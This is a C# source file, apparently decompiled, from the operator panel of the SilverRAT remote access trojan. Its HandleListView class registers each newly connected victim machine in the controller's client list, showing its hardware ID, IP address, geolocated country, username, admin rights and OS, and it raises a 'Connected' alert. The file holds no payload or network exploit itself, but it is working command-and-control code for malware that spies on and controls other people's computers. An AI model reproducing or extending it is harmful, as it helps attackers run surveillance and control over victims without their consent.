using SilverRAT.Connection;
using SilverRAT.Helper;
using SilverRAT.MessagePack;
using SilverRAT.Properties;
using System;
using System.Drawing;
using System.IO;
using System.Reflection;
using System.Resources;
using System.Windows.Forms;

namespace SilverRAT.Handle_Packet;

public class HandleListView
{
    public void AddToListview(Clients client, MsgPack unpack_msgpack)
    {
        try
        {
            lock (Settings.LockBlocked)
            {
                try
                {
                    if (Settings.Blocked.Count > 0)
                    {
                        if (Settings.Blocked.Contains(unpack_msgpack.ForcePathObject("HWID").AsString))
                        {
                            client.Disconnected();
                            return;
                        }
                        if (Settings.Blocked.Contains(client.Ip))
                        {
                            client.Disconnected();
                            return;
                        }
                    }
                }
                catch
                {
                }
            }
            client.DGV = new DataGridViewRow
            {
                Tag = client,
                Height = 38
            };
            string[] array = Program.Silver.cGeoMain.GetIpInf(client.TcpClient.RemoteEndPoint.ToString().Split(':')[0]).Split(':');
            client.DGV.Cells.Add(new DataGridViewImageCell
            {
                Value = GetLogo(unpack_msgpack.ForcePathObject("HWID").AsString, unpack_msgpack.ForcePathObject("Group").AsString),
                ImageLayout = DataGridViewImageCellLayout.Zoom
            });
            client.DGV.Cells.Add(new DataGridViewTextBoxCell
            {
                Value = unpack_msgpack.ForcePathObject("Group").AsString
            });
            client.DGV.Cells.Add(new DataGridViewTextBoxCell
            {
                Value = unpack_msgpack.ForcePathObject("HWID").AsString
            });
            client.DGV.Cells.Add(new DataGridViewTextBoxCell
            {
                Value = client.Ip
            });
            client.DGV.Cells.Add(new DataGridViewTextBoxCell
            {
                Value = client.TcpClient.LocalEndPoint.ToString().Split(':')[1]
            });
            client.DGV.Cells.Add(new DataGridViewImageCell
            {
                Value = Program.Silver.Flag.Images[array[2] + ".png"],
                ImageLayout = DataGridViewImageCellLayout.Zoom
            });
            client.DGV.Cells.Add(new DataGridViewTextBoxCell
            {
                Value = array[1]
            });
            client.DGV.Cells.Add(new DataGridViewTextBoxCell
            {
                Value = unpack_msgpack.ForcePathObject("User").AsString
            });
            client.DGV.Cells.Add(new DataGridViewTextBoxCell
            {
                Value = unpack_msgpack.ForcePathObject("Admin").AsString.Replace("True", "Active").Replace("False", "Inactive")
            });
            client.DGV.Cells.Add(new DataGridViewTextBoxCell
            {
                Value = unpack_msgpack.ForcePathObject("OS").AsString
            });
            client.DGV.Cells.Add(new DataGridViewTextBoxCell
            {
                Value = Convert.ToDateTime(unpack_msgpack.ForcePathObject("Installed").AsString).ToLocalTime()
            });
            client.DGV.Cells.Add(new DataGridViewTextBoxCell
            {
                Value = "OFF"
            });
            client.DGV.Cells.Add(new DataGridViewTextBoxCell
            {
                Value = unpack_msgpack.ForcePathObject("Version").AsString
            });
            client.DGV.Cells.Add(new DataGridViewTextBoxCell
            {
                Value = "0 MS"
            });
            client.DGV.Cells.Add(new DataGridViewTextBoxCell
            {
                Value = unpack_msgpack.ForcePathObject("Performance").AsString
            });
            client.ID = unpack_msgpack.ForcePathObject("HWID").AsString;
            client.DGV.Resizable = DataGridViewTriState.False;
            if (bool.Parse(unpack_msgpack.ForcePathObject("Admin").AsString))
            {
                client.DGV.Cells[8].Style.ForeColor = Color.Green;
                client.DGV.Cells[8].Style.SelectionBackColor = Color.Green;
                client.DGV.Cells[8].Style.ForeColor = Color.White;
            }
            else
            {
                client.DGV.Cells[8].Style.ForeColor = Color.Red;
                client.DGV.Cells[8].Style.SelectionForeColor = Color.Red;
                client.DGV.Cells[8].Style.ForeColor = Color.Black;
            }
            if (!Convert.ToBoolean(unpack_msgpack.ForcePathObject("IsNewClient").AsString))
            {
                client.DGV.Cells[2].Style.BackColor = Color.Orange;
                client.DGV.Cells[2].Style.SelectionBackColor = Color.Orange;
            }
            client.DGV.Cells[11].Style.ForeColor = Color.Red;
            client.DGV.Cells[11].Style.SelectionForeColor = Color.Red;
            client.DGV.Cells[11].Style.BackColor = Color.Black;
            Program.Silver.Invoke((MethodInvoker)delegate
            {
                lock (Settings.LockListviewClients)
                {
                    Program.Silver.ClientsList.Rows.AddRange(client.DGV);
                    Program.Silver.ClientsList.AutoSizeColumnsMode = DataGridViewAutoSizeColumnsMode.AllCells;
                }
            });
            Notifiecation.Load("Client", client.Ip + " Connected", Resources.SuccessNotif, Color.FromArgb(103, 185, 108));
            new HandelListDashboard().Addmsg((Bitmap)client.DGV.Cells[0].Value, client.DGV.Cells[1].Value.ToString(), client.Ip, "Connected", Color.LimeGreen);
        }
        catch
        {
        }
    }

    public Bitmap GetLogo(string UserID, string Nickname)
    {
        try
        {
            if (File.Exists(Settings.PathLogo + "\\" + UserID + ".logo"))
            {
                return new Bitmap(Image.FromFile(Settings.PathLogo + "\\" + UserID + ".logo"));
            }
            if (Nickname.Length > 0)
            {
                Assembly executingAssembly = Assembly.GetExecutingAssembly();
                string baseName = executingAssembly.GetName().Name + ".Properties.Resources";
                ResourceManager resourceManager = new ResourceManager(baseName, executingAssembly);
                return (Bitmap)resourceManager.GetObject(Nickname[0].ToString().ToUpper());
            }
        }
        catch
        {
            return Resources.Empty;
        }
        return Resources.Empty;
    }
}
